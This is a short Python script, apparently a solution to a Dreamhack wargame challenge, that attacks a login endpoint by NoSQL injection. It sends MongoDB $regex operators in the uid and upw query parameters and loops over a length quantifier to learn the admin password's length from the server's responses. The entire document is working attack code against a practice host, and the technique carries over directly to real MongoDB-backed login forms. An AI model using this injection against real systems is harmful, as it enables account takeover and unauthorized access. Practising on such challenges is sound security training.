import requests

HOST = 'http://host3.dreamhack.games:13265'
SUCCESS = 'admin'
i = 1

while True:
    res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=.{{{i}}}')
    if res.text == SUCCESS:
        i += 1
    else:
        i -= 1
        break;

print(f'length of password : {i}')